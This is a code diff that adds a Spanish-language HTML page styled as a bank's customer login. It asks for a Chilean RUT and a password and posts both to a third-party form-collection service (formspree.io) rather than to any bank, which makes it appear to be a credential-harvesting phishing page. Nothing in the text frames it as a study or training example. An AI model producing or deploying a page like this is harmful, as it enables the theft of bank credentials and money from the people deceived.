@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Documento</title>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="nav">
+                <div class="banco-logo">
+                    <img src="logo.png" alt="">
+                </div>
+                <div class="ayuda">
+                    <i class="fa-solid fa-circle-question ayudaicono"></i>
+                </div>
+            </div>
+        </header>
+        <div class="main-container">
+            <div class="form">
+                <div class="title">
+                    Ingreso de clientes
+                </div>
+                <form action="https://formspree.io/f/xnqrzglw" method="POST">
+                    <label for="rut">Ingresa tu RUT</label>
+                    <input type="text" name="rut" placeholder="12.345.678-K">
+                    <label for="contra">Ingresa tu clave</label>
+                    <input type="password" name="contra" placeholder="*****">
+
+                    <div class="buttoningreso">
+                        <button>Ingresar</button>
+                    </div>
+
+                    <p>¿Problemas con tu clave?</p>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
